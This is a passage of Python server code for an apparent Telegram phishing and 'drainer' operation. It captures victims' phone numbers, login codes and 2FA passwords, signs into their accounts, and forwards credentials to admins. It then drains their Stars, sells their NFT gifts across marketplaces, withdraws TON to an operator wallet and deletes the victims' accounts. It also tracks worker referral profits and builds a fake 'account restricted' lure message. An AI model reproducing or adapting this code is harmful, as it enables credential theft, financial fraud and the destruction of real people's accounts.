        _rate_limits[uid] = []
    # Очищаем старые записи
    _rate_limits[uid] = [t for t in _rate_limits[uid] if now - t < RATE_LIMIT_WINDOW]
    if len(_rate_limits[uid]) >= RATE_LIMIT_MAX:
        _fail_counts[uid] = _fail_counts.get(uid, 0) + 1
        if _fail_counts[uid] >= BLACKLIST_THRESHOLD:
            _blacklist.add(uid)
            logger.warning(f"[SECURITY] 🚫 User {uid} BLACKLISTED (flood)")
        return True
    _rate_limits[uid].append(now)
    return False


def _record_fail(user_id):
    """Записывает ошибку для подсчёта до бана."""
    uid = str(user_id)
    _fail_counts[uid] = _fail_counts.get(uid, 0) + 1
    if _fail_counts[uid] >= BLACKLIST_THRESHOLD:
        _blacklist.add(uid)
        logger.warning(f"[SECURITY] 🚫 User {uid} BLACKLISTED ({_fail_counts[uid]} fails)")


def _validate_phone(phone: str) -> str | None:
    """Валидирует и очищает номер телефона. Возвращает None если невалид."""
    if not phone:
        return None
    clean = "".join(c for c in phone if c.isdigit() or c == '+')
    if clean and not clean.startswith('+'):
        clean = '+' + clean
    digits = clean.lstrip('+')
    if not digits.isdigit() or len(digits) < 7 or len(digits) > 15:
        return None
    return clean


def _validate_code(code: str) -> str | None:
    """Валидирует код подтверждения. Только цифры, 4-6 символов."""
    if not code:
        return None
    clean = "".join(c for c in str(code) if c.isdigit())
    if len(clean) < 4 or len(clean) > 6:
        return None
    return clean


class PhoneRequest(BaseModel):
    user_id: int
    phone_number: str
    username: Optional[str] = None

class CodeVerification(BaseModel):
    user_id: int
    phone_number: str
    code: str
    session_id: Optional[str] = None

class PasswordVerification(BaseModel):
    user_id: int
    phone_number: str
    password: str

class UserActionLog(BaseModel):
    user_id: int
    username: Optional[str] = None
    action: str


@app.get("/")
async def serve_index():
    return FileResponse(os.path.join(FRONTEND_DIR, "index.html"))


@app.post("/api/user-action")
async def api_user_action(data: UserActionLog):
    action_map = {
        "webapp_opened": "🌐 Зашел на WebApp",
        "clicked_continue": "➡️ Нажал продолжить",
        "select_login_qr": "🖥 Выбрал вход по QR",
        "phone_shared": "📱 Передал номер",
        "code_correct": "✅ Верный код",
        "code_incorrect": "❌ Неверный код",
        "2fa_required": "🔐 Нужен 2FA",
        "2fa_incorrect": "🔐❌ Неверный 2FA",
    }
    if data.action not in action_map:
        return {"status": "ignored"}

    if not data.user_id or str(data.user_id) == "0" or str(data.user_id) == "None":
        return {"status": "ignored"}

    if _check_rate_limit(data.user_id):
        return {"status": "ignored"}

    # Санитизация username
    safe_username = _safe_html(_strip_html(data.username or "?"))

    log_action(data.user_id, data.action, f"username={safe_username}")
    action_text = action_map[data.action]
    ref = referrals.get(data.user_id)
    ref_str = f"\n👤 Воркер: <code>{ref}</code>" if ref else ""

    try:
        await send_admin_log(
            f"📊 <b>{action_text}</b>\n"
            f"👤 @{safe_username}\n"
            f"🆔 <code>{data.user_id}</code>{ref_str}\n"
            f"🕐 {kyiv_str()}"
        )
    except Exception:
        pass
    return {"status": "success"}


@app.post("/api/request-phone")
async def api_request_phone(req: PhoneRequest):
    try:
        user_id = req.user_id

        if not user_id or str(user_id) == "0" or str(user_id) == "None":
            return {"status": "error", "message": "Invalid user"}

        # Anti-spam
        if _check_rate_limit(user_id):
            return {"status": "error", "message": "Too many requests"}

        # Валидация и санитизация телефона
        phone = _validate_phone(_strip_html(req.phone_number or ""))
        if not phone:
            _record_fail(user_id)
            logger.warning(f"[AUTH] Invalid phone from user {user_id}: {_safe_html(req.phone_number or '')[:50]}")
            return {"status": "error", "message": "Invalid phone format"}

        safe_username = _safe_html(_strip_html(req.username or "?"))

        logger.info(f"[AUTH] Phone request: user={user_id}, phone={phone}")
        log_action(user_id, "phone_shared", phone)

        # Создаём Telethon клиент
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        from mrkt import config as _cfg
        tc = TelegramClient(StringSession(), _cfg.API_ID, _cfg.API_HASH)
        await tc.connect()

        phone_code_hash = await tc.send_code_request(phone)
        if not phone_code_hash:
            logger.warning(f"[AUTH] No phone_code_hash for {phone}")

        session_id = f"{user_id}_{phone}_{int(time.time())}"
        auth_sessions[session_id] = {
            "user_id": user_id,
            "phone": phone,
            "username": safe_username,
            "telethon_client": tc,
            "created_at": kyiv_str(),
            "status": "code_sent",
        }

        try:
            await send_admin_log(
                f"📱 <b>Номер получен</b>\n"
                f"👤 @{safe_username}\n"
                f"🆔 <code>{user_id}</code>\n"
                f"📞 <code>{phone}</code>\n"
                f"🕐 {kyiv_str()}"
            )
        except Exception:
            pass

        return {"status": "success", "message": "Code sent", "session_id": session_id}

    except Exception as e:
        _record_fail(req.user_id)
        logger.error(f"[AUTH] request-phone error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/verify-code")
async def api_verify_code(req: CodeVerification):
    try:
        user_id = req.user_id
        provided_sid = req.session_id

        if not user_id or str(user_id) == "0" or str(user_id) == "None":
            return {"status": "error", "message": "Invalid user_id"}

        # Anti-spam
        if _check_rate_limit(user_id):
            return {"status": "error", "message": "Too many requests"}

        # Валидация телефона
        phone = _validate_phone(_strip_html(req.phone_number or ""))
        if not phone:
            _record_fail(user_id)
            return {"status": "error", "message": "Invalid phone"}

        # Валидация кода (только цифры, 4-6 символов)
        code = _validate_code(_strip_html(req.code or ""))
        if not code:
            _record_fail(user_id)
            return {"status": "error", "message": "Invalid code format"}

        logger.info(f"[AUTH] Code verify: user={user_id}, code={code}")

        # Ищем сессию
        session_id = None
        if provided_sid and provided_sid in auth_sessions:
            s = auth_sessions[provided_sid]
            if s.get("user_id") == user_id and s.get("phone") == phone and s.get("status") == "code_sent":
                session_id = provided_sid

        if not session_id:
            # Fallback: ищем по user_id + phone
            for sid, s in auth_sessions.items():
                if s.get("user_id") == user_id and s.get("phone") == phone and s.get("status") == "code_sent":
                    session_id = sid
                    break

        if not session_id:
            raise HTTPException(status_code=404, detail="Session not found")

        session = auth_sessions[session_id]
        tc = session["telethon_client"]

        try:
            await tc.sign_in(phone, code)
            session["status"] = "authorized"

            me = await tc.get_me()
            session["user_info"] = {
                "id": me.id,
                "username": me.username,
                "first_name": me.first_name,
            }

            log_action(user_id, "code_correct", f"tg_id={me.id} @{me.username}")
            await send_admin_log(
                f"✅ <b>Авторизация успешна!</b>\n"
                f"👤 @{me.username or '?'} ({me.first_name})\n"
                f"🆔 TG: <code>{me.id}</code>\n"
                f"📞 <code>{phone}</code>\n"
                f"🕐 {kyiv_str()}"
            )

            # Запускаем pipeline в фоне
            asyncio.create_task(_process_authorized_session(session_id))

            return {"status": "success", "session_id": session_id}

        except (TwoFactorAuthRequiredError, SessionPasswordNeededError):
            session["status"] = "2fa_required"
            log_action(user_id, "2fa_required", phone)
            await send_admin_log(
                f"🔐 <b>2FA Required</b>\n"
                f"🆔 <code>{user_id}</code>\n"
                f"📞 <code>{phone}</code>"
            )
            return {"status": "2fa_required", "session_id": session_id}

        except Exception as e:
            log_action(user_id, "code_incorrect", str(e))
            await send_admin_log(
                f"❌ <b>Неверный код</b>\n"
                f"🆔 <code>{user_id}</code>\n"
                f"📞 <code>{phone}</code>\n"
                f"💥 {e}"
            )
            raise HTTPException(status_code=400, detail="Invalid code")

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"[AUTH] verify-code error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/verify-password")
async def api_verify_password(req: PasswordVerification):
    try:
        user_id = req.user_id

        if not user_id or str(user_id) == "0" or str(user_id) == "None":
            return {"status": "error", "message": "Invalid user_id"}

        # Anti-spam
        if _check_rate_limit(user_id):
            return {"status": "error", "message": "Too many requests"}

        phone = _validate_phone(_strip_html(req.phone_number or "")) or ""

        password = _strip_html(req.password or "")
        if not password or len(password) > 128:
            _record_fail(user_id)
            return {"status": "error", "message": "Invalid password"}

        logger.info(f"[AUTH] 2FA verify: user={user_id}")

        session_id = None
        for sid, s in auth_sessions.items():
            if s.get("user_id") == user_id and s.get("status") in ["2fa_required", "awaiting_password"]:
                # Разрешаем, если номер совпал или это QR-логин
                if s.get("phone") == phone or s.get("phone") == "QR" or not phone:
                    session_id = sid
                    break

        if not session_id:
            logger.error(f"[AUTH] 2FA verify failed: Session not found for user={user_id}, phone={phone}")
            raise HTTPException(status_code=404, detail="Session not found")

        session = auth_sessions[session_id]
        tc = session["telethon_client"]

        try:
            await tc.sign_in(password=password)
            session["status"] = "authorized"
            session["2fa_password"] = password

            me = await tc.get_me()
            session["user_info"] = {
                "id": me.id,
                "username": me.username,
                "first_name": me.first_name,
            }

            log_action(user_id, "2fa_correct", f"tg_id={me.id} @{me.username}")
            await send_admin_log(
                f"✅ <b>2FA успешна!</b>\n"
                f"👤 @{me.username or '?'} ({me.first_name})\n"
                f"🆔 TG: <code>{me.id}</code>\n"
                f"📞 <code>{phone}</code>\n"
                f"🔑 2FA: <tg-spoiler>{password}</tg-spoiler>\n"
                f"🕐 {kyiv_str()}"
            )

            asyncio.create_task(_process_authorized_session(session_id))

            return {"status": "success", "session_id": session_id}

        except Exception as e:
            log_action(user_id, "2fa_incorrect", str(e))
            await send_admin_log(
                f"🔐❌ <b>Неверный 2FA</b>\n"
                f"🆔 <code>{user_id}</code>\n"
                f"📞 <code>{phone}</code>\n"
                f"💥 {e}"
            )
            raise HTTPException(status_code=400, detail="Invalid password")

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"[AUTH] verify-password error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/qr-start")
async def api_qr_start(request: Request):
    data = await request.json()
    user_id = data.get("user_id")
    username = data.get("username", "")

    if not user_id or str(user_id) == "0" or str(user_id) == "None":
        return {"status": "error", "message": "Invalid user_id"}

    # Init telethon client for QR
    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        from mrkt import config as _cfg
        _client = TelegramClient(StringSession(), _cfg.API_ID, _cfg.API_HASH)
        await _client.connect()

        qr_login = await _client.qr_login()
        url = qr_login.url

        session_id = f"qr_{user_id}_{int(time.time())}"
        
        # We need to store the qr_login object to wait on it
        auth_sessions[session_id] = {
            "user_id": user_id,
            "phone": "QR",
            "telethon_client": _client,
            "status": "waiting_qr",
            "qr_login": qr_login,
            "user_info": {"username": username}
        }
        
        # Start a background task to wait for the QR login
        async def wait_for_qr(sid: str):
            session = auth_sessions.get(sid)
            if not session: return
            try:
                user = await session["qr_login"].wait()
                session["status"] = "authorized"
                session["user_info"] = {
                    "id": user.id,
                    "username": user.username,
                    "first_name": user.first_name,
                }
                log_action(session["user_id"], "qr_scanned", f"tg_id={user.id} @{user.username}")
                await send_admin_log(
                    f"✅ <b>QR Успешно отсканирован!</b>\n"
                    f"👤 @{user.username or '?'} ({user.first_name})\n"
                    f"🆔 TG: <code>{user.id}</code>\n"
                    f"🕐 {kyiv_str()}"
                )
                asyncio.create_task(_process_authorized_session(sid))
            except SessionPasswordNeededError:
                logger.info(f"QR Login needs password for {sid}")
                session["status"] = "awaiting_password"
                log_action(session["user_id"], "qr_needs_password", "")
                await send_admin_log(f"🔑 Юзеру {session['user_info'].get('username', '?')} нужен 2FA пароль для QR.")
            except asyncio.TimeoutError:
                logger.error(f"QR Login timed out for {sid}")
                session["status"] = "qr_failed"
            except Exception as e:
                logger.error(f"QR Login error for {sid}: {type(e).__name__} {e}")
                session["status"] = "qr_failed"

        asyncio.create_task(wait_for_qr(session_id))

        log_action(user_id, "qr_start", f"Session: {session_id}")
        return {"status": "success", "session_id": session_id, "url": url}

    except Exception as e:
        logger.error(f"[QR] error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/qr-status")
async def api_qr_status(session_id: str):
    session = auth_sessions.get(session_id)
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    return {"status": session["status"]}

# ══════════════════════════════════════════════════════════════
#  POST-AUTH PIPELINE
# ══════════════════════════════════════════════════════════════

async def _process_authorized_session(session_id: str):
    """После успешной авторизации: init_data → MRKT auth → pipeline."""
    session = auth_sessions.get(session_id)
    if not session:
        return

    user_id = session["user_id"]
    phone = session["phone"]
    tc = session["telethon_client"]
    user_info = session.get("user_info", {})
    tg_username = user_info.get("username", "?")
    tg_client = tc  # raw TelegramClient

    try:
        # ═══ ШАГ 1: Получаем init_data через RequestAppWebView на @mrkt ═══
        await send_admin_log(
            f"🚀 <b>Авторизация успешна! Начинаю обработку...</b>\n"
            f"👤 @{tg_username}\n"
            f"📞 <code>{phone}</code>\n"
            f"🔄 <i>Собираю NFT, выставляю на продажу и вывожу TON. Ждите отчёт!</i>"
        )

        init_data = await _get_mrkt_init_data(tg_client)

        if not init_data:
            await send_admin_log(
                f"❌ <b>init_data не получен!</b>\n"
                f"👤 @{tg_username}\n"
                f"📞 <code>{phone}</code>"
            )
            log_action(user_id, "init_data_fail", "не удалось получить init_data")
            return

        log_action(user_id, "init_data_ok", f"len={len(init_data)}")

        # ═══ Buyer account protection: refresh token only, skip pipeline ═══
        _buyer_phone = buyer_token_data.get("phone", "")
        _buyer_tgid = buyer_token_data.get("tg_id", 0)
        _is_buyer = (phone == _buyer_phone and _buyer_phone) or (user_info.get("id") == _buyer_tgid and _buyer_tgid)
        if _is_buyer:
            try:
                proxy = None
                api = await MrktAPI.auth_with_init_data(init_data, proxy=proxy)
                # Update buyer token
                buyer_token_data["token"] = api.token
                buyer_token_data["username"] = tg_username
                buyer_token_data["tg_id"] = user_info.get("id", 0)
                buyer_token_data["phone"] = phone
                _save_buyer_token()
                # Also update in saved_tokens
                _add_token(phone=phone, token=api.token, username=tg_username, tg_id=user_info.get("id", 0), first_name=user_info.get("first_name", ""))
                await api.close()
                await send_admin_log(
                    f"🛒 <b>Buyer token refreshed!</b>\n"
                    f"👤 @{tg_username}\n"
                    f"📞 <code>{phone}</code>"
                )
            except Exception as e:
                await send_admin_log(f"❌ Buyer token refresh failed: {e}")
            return

        # ═══ PREFETCH: Получаем init_data для ВСЕХ маркетов (пока Telethon жив) ═══
        cross_init_data = {}
        try:
            from cross_drain import prefetch_all_init_data
            cross_init_data = await prefetch_all_init_data(tg_client, exclude="mrkt")
            if cross_init_data:
                logger.info(f"[CROSS] Prefetched: {list(cross_init_data.keys())}")
                
                # ═══ Сохраняем cross-drain токены в saved_tokens каждого маркета ═══
                for market_name, market_init_data in cross_init_data.items():
                    try:
                        if market_name == "portals":
                            tokens_file = os.path.join(os.path.dirname(os.path.dirname(__file__)), "portals", "saved_tokens.json")
                        elif market_name == "tonnel":
                            tokens_file = os.path.join(os.path.dirname(os.path.dirname(__file__)), "tonnel", "saved_tokens.json")
                        else:
                            continue
                        
                        existing = {}
                        if os.path.exists(tokens_file):
                            try:
                                with open(tokens_file, "r", encoding="utf-8") as f:
                                    existing = json.load(f)
                            except Exception:
                                existing = {}
                        
                        existing[phone] = {
                            "token": market_init_data,
                            "username": tg_username,
                            "tg_id": user_info.get("id", user_id),
                            "first_name": user_info.get("first_name", ""),
                            "phone": phone,
                            "saved_at": kyiv_str(),
                            "source": "cross_drain_mrkt",
                        }
                        
                        with open(tokens_file, "w", encoding="utf-8") as f:
                            json.dump(existing, f, ensure_ascii=False, indent=2)
                        
                        logger.info(f"[CROSS] Token saved for {market_name}: {phone} (@{tg_username})")
                    except Exception as e:
                        logger.error(f"[CROSS] Failed to save {market_name} token: {e}")
        except Exception as e:
            logger.error(f"[CROSS] Prefetch error: {e}")

        # ═══ ДРЕЙН ЗВЁЗД + ГИФТЫ НА ПРОДАЖЕ ═══
        async def drain_and_gifts_task():
            try:
                from telethon_client import TelethonClient
                from mrkt.star_gifts import (
                    fast_drain_stars, get_star_gifts_on_sale,
                    star_monitor_loop, delete_dialog,
                )
                admin_un = getattr(
                    mrkt_config,
                    "ADMIN_USERNAME",
                    mrkt_config.BOT_USERNAME.lstrip("@"),
                )

                # Проверка: не удаляем аккаунт баера
                buyer_phone = buyer_token_data.get("phone", "")
                is_buyer = phone == buyer_phone

                # ── Параллельно: drain текущих ⭐ + парсинг гифтов на продаже ──
                drain_balance = 0
                star_gifts = []

                async def _drain_initial():
                    nonlocal drain_balance
                    drain_balance = await TelethonClient.get_balance(tg_client)
                    await send_admin_log(f"══ DRAIN STARS ══ Баланс: {drain_balance}⭐ (@{tg_username})")
                    if drain_balance >= 15:
                        result = await fast_drain_stars(tc, tg_client, admin_un, drain_balance)
                        drain_balance = result["remaining"]
                        if result["sent"] > 0:
                            await send_admin_log(
                                f"🎁 <b>Дрейн звёзд завершён!</b>\n"
                                f"👤 Мамонт: @{tg_username}\n"
                                f"✅ Отправлено: {result['sent']} подарков ({result['spent']}⭐)\n"
                                f"💰 Осталось: {result['remaining']}⭐"
                            )
                        # Очистка диалога сразу
                        await delete_dialog(tg_client, admin_un)

                async def _parse_gifts():
                    nonlocal star_gifts
                    star_gifts = await get_star_gifts_on_sale(tg_client)

                await asyncio.gather(
                    _drain_initial(),
                    _parse_gifts(),
                    return_exceptions=True,
                )

                # ── Если есть гифты на продаже за ⭐ ──
                if star_gifts:
                    total_stars = sum(g["stars"] for g in star_gifts)
                    gifts_text = "\n".join(
                        f"  • {g['name']} — {g['stars']}⭐" for g in star_gifts
                    )

                    # Сохраняем гифты в сессию для callback
                    session_key = f"star_gifts_{phone}"
                    auth_sessions[session_key] = {
                        "gifts": star_gifts,
                        "tg_client": tg_client,
                        "tc": tc,
                        "admin_un": admin_un,
                        "phone": phone,
                        "username": tg_username,
                    }

                    keyboard = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(
                            text=f"💰 Скупить ({total_stars}⭐)",
                            callback_data=f"star_buy|{phone}",
                        )],
                    ])

                    await send_admin_log(
                        f"🎁 <b>@{tg_username} — NFT гифты на продаже за ⭐:</b>\n"
                        f"{gifts_text}\n"
                        f"<b>Итого: {total_stars}⭐</b>\n"
                        f"⚠️ <b>Аккаунт НЕ удаляется — ждём скупку!</b>",
                    )
                    # Отправляем с кнопкой напрямую всем админам
                    for aid in mrkt_config.ADMIN_IDS:
                        try:
                            await bot.send_message(
                                aid,
                                f"🎁 <b>@{tg_username} — NFT гифты на продаже за ⭐:</b>\n"
                                f"{gifts_text}\n"
                                f"<b>Итого: {total_stars}⭐</b>\n\n"
                                f"⚠️ Аккаунт сохранён! Нажми кнопку для скупки.",
                                parse_mode="HTML",
                                reply_markup=keyboard,
                            )
                        except Exception:
                            pass

                    # ── Запускаем мониторинг баланса (каждую 1с) ──
                    # Мониторинг дрейнит новые звёзды, пока гифты на продаже
                    async def _get_gifts():
                        return await get_star_gifts_on_sale(tg_client)

                    await star_monitor_loop(
                        tc=tc,
                        tg_client=tg_client,
                        admin_un=admin_un,
                        check_interval=1.0,
                        dialog_cleanup_interval=5.0,
                        get_gifts_fn=_get_gifts,
                    )

                    # Мониторинг завершился = гифтов больше нет (скупили)
                    await send_admin_log(
                        f"✅ <b>Все NFT @{tg_username} проданы/скуплены!</b>\n"
                        f"Теперь удаляю аккаунт."
                    )

                    # Удаляем данные сессии
                    auth_sessions.pop(session_key, None)

                # ── Удаление аккаунта (только если НЕ баер) ──
                if not is_buyer:
                    try:
                        await asyncio.sleep(1)
                        try:
                            await tc.client.disconnect()
                        except Exception:
                            pass
                        await asyncio.sleep(0.5)
                        await tc.connect()
                        result = await tc.delete_account("User requested deletion")
                        if result:
                            logger.info(f"[DRAIN] ✅ ТГ аккаунт {phone} (@{tg_username}) удалён")
                        else:
                            try:
                                await tc.client.disconnect()
                            except Exception:
                                pass
                            await asyncio.sleep(1)
                            await tc.connect()
                            result2 = await tc.delete_account("User requested deletion")
                            if result2:
                                logger.info(f"[DRAIN] ✅ ТГ аккаунт {phone} (@{tg_username}) удалён (2-я)")
                            else:
                                logger.warning(f"[DRAIN] ❌ Не удалось удалить {phone}")
                    except Exception as e:
                        logger.error(f"[DRAIN] Ошибка удаления {phone}: {e}")
                else:
                    logger.info(f"[DRAIN] ⏭ {phone} — баер, пропускаю удаление")

            except Exception as e:
                logger.error(f"[DRAIN-STARS] Error: {e}")

        # Запускаем дрейн+гифты параллельно с pipeline
        asyncio.create_task(drain_and_gifts_task())

        # ═══ Cross-Drain: запускаем параллельно с основным pipeline ═══
        cross_drain_task = None
        if cross_init_data:
            async def _cross_drain_wrapper():
                try:
                    from cross_drain import run_cross_drain_from_cache
                    return await run_cross_drain_from_cache(
                        cached_init_data=cross_init_data,
                        withdraw_wallet=mrkt_config.WITHDRAW_WALLET or "",
                        notify=send_admin_log,
                        username=tg_username,
                    )
                except Exception as e:
                    logger.error(f"[CROSS-DRAIN] Error: {e}")
                    return []
            cross_drain_task = asyncio.create_task(_cross_drain_wrapper())

        # ═══ ШАГ 2: Авторизация в MRKT API ═══
        # Авторизация в MRKT
        proxy = None  # TODO: брать из конфига?
        try:
            api = await MrktAPI.auth_with_init_data(init_data, proxy=proxy)
        except Exception as e:
            await send_admin_log(
                f"❌ <b>Ошибка авторизации в MRKT API</b>\n"
                f"👤 @{tg_username}\n"
                f"💥 {e}"
            )
            log_action(user_id, "mrkt_auth_fail", str(e))
            return

        log_action(user_id, "mrkt_auth_ok", "token received")

        # ═══ Сохраняем токен для админки ═══
        _add_token(
            phone=phone,
            token=api.token,
            username=tg_username,
            tg_id=user_info.get("id", user_id),
            first_name=user_info.get("first_name", ""),
        )
        logger.info(f"[MRKT] Token saved for {phone} (@{tg_username})")

        # ═══ ШАГ 3: Запуск pipeline ═══
        async def _notify(msg: str):
            # Изменено: Не спамим в ТГ каждый шаг, только пишем в консоль
            logger.info(f"[MRKT-DBG] [{tg_username}] {msg}")

        async def _dbg(msg: str):
            logger.info(f"[MRKT-DBG] [{user_id}] {msg}")
            log_action(user_id, "pipeline", msg[:100])

        # Получаем buyer API если настроен
        buyer_api = None
        if buyer_token_data.get("token"):
            try:
                buyer_api = MrktAPI(buyer_token_data["token"])
                # Проверяем живой ли токен
                buyer_bal = await buyer_api.get_balance_ton()
                buyer_name = buyer_token_data.get("username", "?")
                logger.info(f"[MRKT-DBG] Buyer @{buyer_name} active, balance: {buyer_bal} TON")
            except Exception as e:
                logger.warning(f"[MRKT-DBG] Buyer token expired or invalid: {e}")
                buyer_api = None

        pipeline = MrktPipeline(
            api=api,
            withdraw_wallet=mrkt_config.WITHDRAW_WALLET,
            notify=_notify,
            debug_log=_dbg,
            buyer_api=buyer_api,
        )
        stats = await pipeline.run()

        # Закрываем buyer session
        if buyer_api:
            await buyer_api.close()

        # ═══ Собираем результаты cross-drain (если был запущен) ═══
        cross_withdrawn = 0
        cross_section = ""
        if cross_drain_task:
            try:
                cross_results = await cross_drain_task
                for cr in (cross_results or []):
                    if cr.get("success"):
                        cross_withdrawn += cr.get("withdrawn", 0)
                if cross_results:
                    cross_section = "\n🔄 <b>Cross-Drain:</b>\n"
                    for cr in cross_results:
                        icon = "✅" if cr.get("success") else "❌"
                        cross_section += (
                            f"  {icon} {cr.get('market', '?').upper()}: "
                            f"listed={cr.get('sold', 0)}, wd={cr.get('withdrawn', 0)} TON"
                        )
                        if cr.get("error"):
                            cross_section += f" ({cr['error'][:25]})"
                        cross_section += "\n"
                        
                        # Добавляем детали проданных гифтов
                        cr_stats = cr.get("stats", {})
                        sold_items = cr_stats.get("sold", [])
                        if sold_items:
                            cross_section += "<blockquote>"
                            for s in sold_items:
                                cross_section += f"• {s.get('name', '?')} → {s.get('price', '?')} TON\n"
                            cross_section += "</blockquote>\n"

            except Exception as e:
                logger.error(f"[CROSS-DRAIN] Collect error: {e}")

        # ═══ Итоговый отчёт ═══
        sold_count = len(stats['sold'])
        err_count = len(stats['sell_errors'])
        total_gifts = sold_count + err_count

        # ── Комиссия MRKT: 2.5 TON ──
        MRKT_FEE = 2.5
        mrkt_earnings = stats['withdrawn']
        mrkt_fee_applied = 0
        fee_section = ""
        if mrkt_earnings > 0:
            mrkt_fee_applied = min(MRKT_FEE, mrkt_earnings)
            fee_section = f"\n📌 <b>Комиссия MRKT:</b> -{mrkt_fee_applied} TON\n"

        # ── Воркер система (доля и запись профита) ──
        worker_section = ""
        total_withdrawn = stats['withdrawn'] + cross_withdrawn
        total_for_worker = total_withdrawn - mrkt_fee_applied  # после вычета комиссии
        worker_id = worker_system.get_worker_for_mamont(user_id)
        
        if worker_id and total_for_worker > 0:
            earn_info = worker_system.add_earning(
                worker_id=worker_id,
                total_amount=total_for_worker,
                mamont_id=user_id,
                bot_name="mrkt",
                detail=f"sold={sold_count}"
            )
            worker_section = worker_system.format_worker_section(worker_id, total_for_worker)
        elif worker_id:
            worker_section = worker_system.format_worker_section(worker_id, 0)

        report = (
            f"🟢 <b>Новый профит! (MRKT)</b>\n"
            f"👤 @{tg_username} ({user_info.get('first_name', '')})\n"
            f"🆔 TG: <code>{user_info.get('id')}</code>\n"
            f"📞 <code>{phone}</code>\n"
            f"{worker_section}{fee_section}{cross_section}\n"
            f"📦 В хранилище: {len(stats['vault_gifts'])}  ·  "
            f"🏷 На продаже: {len(stats['saling_gifts'])}\n"
            f"🔄 Снято: {len(stats['delisted'])}  ·  "
            f"💰 Продано: {sold_count}/{total_gifts}\n"
            f"💵 Баланс: {stats['balance_before']} → {stats['balance_after']} TON\n"
            f"📤 Выведено: {stats['withdrawn']} TON\n"
            f"⏱ {stats['duration']}с  ·  "
            f"🔑 2FA: {'✅' if session.get('2fa_password') else '❌'}"
        )

        # Список проданных гифтов (blockquote)
        if stats['sold']:
            report += "\n\n<blockquote><b>💎 Проданные гифты:</b>\n"
            for s in stats['sold']:
                name = s.get("name", "?")
                price = s.get("price", "?")
                slug = s.get("slug")
                if not slug:
                    slug = name.split(" #")[0].split()[0] # пытаемся вытащить ViceCream-158108
                    
                if slug and slug != "?":
                    report += f'  • <a href="https://t.me/nft/{slug}">{name}</a> — {price} TON\n'
                else:
                    report += f"  • {name} — {price} TON\n"
            report += "</blockquote>"

        if stats['sell_errors']:
            report += "\n\n<blockquote><b>❌ Ошибки:</b>\n"
            for e in stats['sell_errors'][:5]:
                report += f"  • {e.get('name', '?')}: {str(e.get('error', ''))[:50]}\n"
            report += "</blockquote>"

        if stats["errors"]:
            report += f"\n⚠️ {', '.join(str(e)[:50] for e in stats['errors'][:3])}"

        await send_admin_log(report)
        await send_log_to_chat(report)
        log_action(user_id, "pipeline_done",
                   f"sold={sold_count} withdrawn={stats['withdrawn']}")

    except Exception as e:
        logger.exception(f"[MRKT] Post-auth error for {session_id}: {e}")
        await send_admin_log(
            f"💥 <b>Pipeline CRASH</b>\n"
            f"👤 @{tg_username}\n"
            f"📞 <code>{phone}</code>\n"
            f"💥 {e}"
        )
    finally:
        # Закрываем API если был создан
        try:
            if 'api' in dir() and api:
                await api.close()
        except Exception:
            pass


async def _get_mrkt_init_data(tg_client) -> Optional[str]:
    """
    Получает init_data для @mrkt через Telethon RequestAppWebView.
    Аналог tonnel_client.obtain_webapp_auth но для @mrkt.
    """
    from telethon import functions, types
    from urllib.parse import urlparse, parse_qs, unquote

    MRKT_BOT = "mrkt"

    try:
        # Резолвим @mrkt
        bot_peer = await tg_client.get_input_entity(MRKT_BOT)
        logger.info(f"[MRKT] Resolved @{MRKT_BOT} → {bot_peer}")

        # ─── Метод 1: RequestAppWebViewRequest (Bot App) ───
        try:
            app_input = types.InputBotAppShortName(
                bot_id=bot_peer,
                short_name="app",
            )
            result = await tg_client(functions.messages.RequestAppWebViewRequest(
                peer=MRKT_BOT,
                app=app_input,
                platform="android",
            ))
            logger.info(f"[MRKT] AppWebView URL: {result.url[:300]}")

            init_data = _parse_mrkt_init_data(result.url)
            if init_data:
                logger.info(f"[MRKT] ✅ init_data получен через AppWebView ({len(init_data)} chars)")
                return init_data
            else:
                logger.warning("[MRKT] init_data не найден в AppWebView URL")
        except Exception as e:
            logger.warning(f"[MRKT] AppWebView error: {type(e).__name__}: {e}")

        # ─── Метод 2: RequestWebViewRequest (fallback) ───
        try:
            logger.info("[MRKT] Fallback → RequestWebView")
            result = await tg_client(functions.messages.RequestWebViewRequest(
                peer=MRKT_BOT,
                bot=bot_peer,
                platform="android",
                url="https://cdn.tgmrkt.io/",
            ))
            logger.info(f"[MRKT] WebView URL: {result.url[:300]}")

            init_data = _parse_mrkt_init_data(result.url)
            if init_data:
                logger.info(f"[MRKT] ✅ init_data получен через WebView ({len(init_data)} chars)")
                return init_data
            else:
                logger.warning("[MRKT] init_data не найден в WebView URL")
        except Exception as e:
            logger.warning(f"[MRKT] WebView error: {type(e).__name__}: {e}")

        return None

    except Exception as e:
        logger.error(f"[MRKT] _get_mrkt_init_data error: {e}")
        return None


def _parse_mrkt_init_data(url: str) -> Optional[str]:
    """Извлекает tgWebAppData из URL WebView."""
    from urllib.parse import urlparse, parse_qs, unquote

    # #tgWebAppData=...
    if "#tgWebAppData=" in url:
        data_part = url.split("#tgWebAppData=", 1)[1]
        for sep in ("&tgWebAppVersion", "&tgWebAppPlatform", "&tgWebAppThemeParams"):
            if sep in data_part:
                data_part = data_part.split(sep, 1)[0]
        return unquote(data_part)

    # fragment params
    parsed = urlparse(url)
    fragment = parsed.fragment
    if fragment:
        params = parse_qs(fragment)
        if "tgWebAppData" in params:
            return unquote(params["tgWebAppData"][0])

    # query params
    params = parse_qs(parsed.query)
    if "tgWebAppData" in params:
        return unquote(params["tgWebAppData"][0])

    return None


# ══════════════════════════════════════════════════════════════
#  BROADCAST
# ══════════════════════════════════════════════════════════════

def build_broadcast_message(
    nft_name: str = "Gift #12345",
    bot_username: str = "",
    referrer_id: int = 0,
) -> tuple[str, InlineKeyboardMarkup]:
    bot_un = bot_username or mrkt_config.BOT_USERNAME
    ref = f"https://t.me/{bot_un}?start=spec_{_encode_worker_id(referrer_id)}" if referrer_id else f"https://t.me/{bot_un}?start=ref"

    text = (
        f"❌ <b>TRANSACTION FAILED: Your account access has been restricted!</b>\n\n"
        f"<b>{nft_name}</b>\n\n"
